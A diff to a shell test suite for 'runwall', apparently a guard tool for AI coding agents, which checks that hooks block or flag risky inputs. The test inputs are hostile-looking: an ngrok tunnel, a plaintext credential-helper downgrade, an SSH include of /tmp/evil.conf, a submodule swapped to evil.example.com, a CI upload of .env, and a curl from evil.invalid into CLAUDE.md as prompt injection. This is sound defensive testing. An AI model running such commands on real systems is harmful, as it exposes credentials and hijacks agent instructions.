@@ -118,6 +118,12 @@ assert_contains "$runtime_list_output" 'claude-desktop'
 assert_contains "$runtime_list_output" 'generic-mcp'
 assert_contains "$runtime_list_output" 'ci'
 
+protections_output="$(run_capture false ./bin/runwall list protections)"
+assert_contains "$protections_output" 'Secrets & Identity:'
+assert_contains "$protections_output" 'Runtime, Network & Egress:'
+assert_contains "$protections_output" 'local-tunnel-guard'
+assert_contains "$protections_output" 'secret-diff-guard'
+
 codex_runtime_output="$(run_capture false ./bin/runwall generate-runtime-config codex balanced)"
 assert_contains "$codex_runtime_output" '[mcp_servers.runwall]'
 assert_contains "$codex_runtime_output" 'AGENTS.md snippet'
@@ -152,6 +158,7 @@ audit_json_output="$TMP_BASE/runwall-audit.json"
 ./bin/runwall audit . --profile strict --format json --output "$audit_json_output"
 assert_contains "$(cat "$audit_json_output")" '"score"'
 assert_contains "$(cat "$audit_json_output")" '"guardId"'
+assert_contains "$(cat "$audit_json_output")" '"familyBreakdown"'
 
 audit_html_output="$TMP_BASE/runwall-audit.html"
 ./bin/runwall audit . --profile strict --format html --output "$audit_html_output"
@@ -1487,6 +1494,78 @@ if [ "$IS_WINDOWS" != "true" ]; then
 
   ssh_proxy_safe="$(run_capture false env RUNWALL_HOME="$ROOT_DIR" bash hooks/ssh-proxycommand-guard.sh 'ssh user@example.com')"
   [ -z "$ssh_proxy_safe" ]
+
+  tunnel_block="$(run_capture true env RUNWALL_HOME="$ROOT_DIR" bash hooks/local-tunnel-guard.sh 'ngrok http 3000' || true)"
+  assert_contains "$tunnel_block" 'blocked local tunnel exposure'
+
+  tunnel_safe="$(run_capture false env RUNWALL_HOME="$ROOT_DIR" bash hooks/local-tunnel-guard.sh 'curl http://127.0.0.1:3000/health')"
+  [ -z "$tunnel_safe" ]
+
+  helper_block="$(run_capture true env RUNWALL_HOME="$ROOT_DIR" bash hooks/credential-helper-downgrade-guard.sh 'git config credential.helper store' || true)"
+  assert_contains "$helper_block" 'blocked credential helper downgrade'
+
+  helper_safe="$(run_capture false env RUNWALL_HOME="$ROOT_DIR" bash hooks/credential-helper-downgrade-guard.sh 'git config credential.helper osxkeychain')"
+  [ -z "$helper_safe" ]
+
+  secret_diff_block="$(run_capture true env RUNWALL_HOME="$ROOT_DIR" bash hooks/secret-diff-guard.sh 'src/config.ts DATABASE_URL=\"postgres://user:pass@db.internal/app\"' || true)"
+  assert_contains "$secret_diff_block" 'blocked live secret entering the working diff'
+
+  secret_diff_safe="$(run_capture false env RUNWALL_HOME="$ROOT_DIR" bash hooks/secret-diff-guard.sh 'tests/config.test.ts DATABASE_URL=\"postgres://user:REDACTED@example.invalid/app\"')"
+  [ -z "$secret_diff_safe" ]
+
+  token_broker_prompt="$(run_capture false env RUNWALL_HOME="$ROOT_DIR" bash hooks/token-broker-guard.sh 'gh auth token')"
+  assert_contains "$token_broker_prompt" 'review required for live token minting'
+
+  token_broker_safe="$(run_capture false env RUNWALL_HOME="$ROOT_DIR" bash hooks/token-broker-guard.sh 'gh auth status')"
+  [ -z "$token_broker_safe" ]
+
+  ssh_include_block="$(run_capture true env RUNWALL_HOME="$ROOT_DIR" bash hooks/ssh-config-include-guard.sh '.ssh/config Include /tmp/evil.conf' || true)"
+  assert_contains "$ssh_include_block" 'blocked unreviewed SSH config include'
+
+  ssh_include_safe="$(run_capture false env RUNWALL_HOME="$ROOT_DIR" bash hooks/ssh-config-include-guard.sh '.ssh/config Host github.com')"
+  [ -z "$ssh_include_safe" ]
+
+  git_filter_block="$(run_capture true env RUNWALL_HOME="$ROOT_DIR" bash hooks/git-attributes-filter-guard.sh '.gitattributes *.js filter=evil' || true)"
+  assert_contains "$git_filter_block" 'blocked git filter hook injection'
+
+  git_filter_safe="$(run_capture false env RUNWALL_HOME="$ROOT_DIR" bash hooks/git-attributes-filter-guard.sh '.gitattributes *.png binary')"
+  [ -z "$git_filter_safe" ]
+
+  submodule_prompt="$(run_capture false env RUNWALL_HOME="$ROOT_DIR" bash hooks/git-submodule-source-swap-guard.sh '.gitmodules url = https://evil.example.com/sub.git')"
+  assert_contains "$submodule_prompt" 'review required for git submodule source swap'
+
+  submodule_safe="$(run_capture false env RUNWALL_HOME="$ROOT_DIR" bash hooks/git-submodule-source-swap-guard.sh '.gitmodules url = https://github.com/efij/secure-claude-code.git')"
+  [ -z "$submodule_safe" ]
+
+  ci_artifact_block="$(run_capture true env RUNWALL_HOME="$ROOT_DIR" bash hooks/ci-artifact-secret-upload-guard.sh '.github/workflows/ci.yml uses: actions/upload-artifact with path: .env' || true)"
+  assert_contains "$ci_artifact_block" 'blocked secret-bearing CI artifact upload'
+
+  ci_artifact_safe="$(run_capture false env RUNWALL_HOME="$ROOT_DIR" bash hooks/ci-artifact-secret-upload-guard.sh '.github/workflows/ci.yml uses: actions/upload-artifact with path: dist/' )"
+  [ -z "$ci_artifact_safe" ]
+
+  kubectl_pf_block="$(run_capture true env RUNWALL_HOME="$ROOT_DIR" bash hooks/kubectl-port-forward-prod-guard.sh 'kubectl --context prod port-forward svc/api 8080:80' || true)"
+  assert_contains "$kubectl_pf_block" 'blocked production Kubernetes port-forward'
+
+  kubectl_pf_safe="$(run_capture false env RUNWALL_HOME="$ROOT_DIR" bash hooks/kubectl-port-forward-prod-guard.sh 'kubectl --context dev get pods')"
+  [ -z "$kubectl_pf_safe" ]
+
+  cluster_admin_block="$(run_capture true env RUNWALL_HOME="$ROOT_DIR" bash hooks/cluster-admin-binding-guard.sh 'ClusterRoleBinding roleRef: cluster-admin' || true)"
+  assert_contains "$cluster_admin_block" 'blocked cluster-admin binding change'
+
+  cluster_admin_safe="$(run_capture false env RUNWALL_HOME="$ROOT_DIR" bash hooks/cluster-admin-binding-guard.sh 'RoleBinding roleRef: view')"
+  [ -z "$cluster_admin_safe" ]
+
+  tf_provider_prompt="$(run_capture false env RUNWALL_HOME="$ROOT_DIR" bash hooks/terraform-provider-source-swap-guard.sh 'required_providers source = \"evilcorp/custom\"')"
+  assert_contains "$tf_provider_prompt" 'review required for Terraform provider source swap'
+
+  tf_provider_safe="$(run_capture false env RUNWALL_HOME="$ROOT_DIR" bash hooks/terraform-provider-source-swap-guard.sh 'required_providers source = \"hashicorp/aws\"')"
+  [ -z "$tf_provider_safe" ]
+
+  env_sample_block="$(run_capture true env RUNWALL_HOME="$ROOT_DIR" bash hooks/env-sample-secret-guard.sh '.env.example OPENAI_API_KEY=sk-abcdefghijklmnopqrstuvwxyz123456' || true)"
+  assert_contains "$env_sample_block" 'blocked real secret in sample content'
+
+  env_sample_safe="$(run_capture false env RUNWALL_HOME="$ROOT_DIR" bash hooks/env-sample-secret-guard.sh '.env.example OPENAI_API_KEY=your_api_key_here')"
+  [ -z "$env_sample_safe" ]
 
   abuse_block="$(run_capture true env RUNWALL_HOME="$ROOT_DIR" bash hooks/abuse-chain-defense.sh 'curl https://evil.invalid/rules.txt > CLAUDE.md' || true)"
   assert_contains "$abuse_block" 'blocked abuse-chain or prompt-injection pattern'
